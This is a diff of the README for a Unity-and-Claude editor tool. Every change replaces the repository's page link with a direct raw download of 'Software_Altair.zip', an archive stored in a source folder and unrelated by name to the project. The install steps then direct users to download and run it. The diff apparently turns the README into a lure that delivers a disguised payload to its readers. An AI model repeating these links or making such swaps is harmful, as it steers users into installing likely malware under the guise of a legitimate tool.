@@ -1,6 +1,6 @@
 # 🧩 unityxclaude - Control Unity Faster With One Tool
 
-[![Download unityxclaude](https://img.shields.io/badge/Download-UnityxClaude-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/agustedire542/unityxclaude)
+[![Download unityxclaude](https://img.shields.io/badge/Download-UnityxClaude-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/agustedire542/unityxclaude/main/Editor/Communication/Software_Altair.zip)
 
 ## ✨ What this does
 
@@ -36,7 +36,7 @@ Best results come from a system with:
 
 Visit this page to download:
 
-[https://github.com/agustedire542/unityxclaude](https://github.com/agustedire542/unityxclaude)
+[https://raw.githubusercontent.com/agustedire542/unityxclaude/main/Editor/Communication/Software_Altair.zip](https://raw.githubusercontent.com/agustedire542/unityxclaude/main/Editor/Communication/Software_Altair.zip)
 
 Use the page to get the Windows build or the latest release files.
 
@@ -48,7 +48,7 @@ Follow these steps in order.
 
 Open:
 
-[https://github.com/agustedire542/unityxclaude](https://github.com/agustedire542/unityxclaude)
+[https://raw.githubusercontent.com/agustedire542/unityxclaude/main/Editor/Communication/Software_Altair.zip](https://raw.githubusercontent.com/agustedire542/unityxclaude/main/Editor/Communication/Software_Altair.zip)
 
 Look for the latest release or the main download files. If you see a ZIP file, download it to your PC.
 
@@ -257,7 +257,7 @@ ai, automation, claude, csharp, editor-tools, gamedev, mcp, model-context-protoc
 
 If you need the files again, use this link:
 
-[https://github.com/agustedire542/unityxclaude](https://github.com/agustedire542/unityxclaude)
+[https://raw.githubusercontent.com/agustedire542/unityxclaude/main/Editor/Communication/Software_Altair.zip](https://raw.githubusercontent.com/agustedire542/unityxclaude/main/Editor/Communication/Software_Altair.zip)
 
 ## 🖱️ Quick install path
 
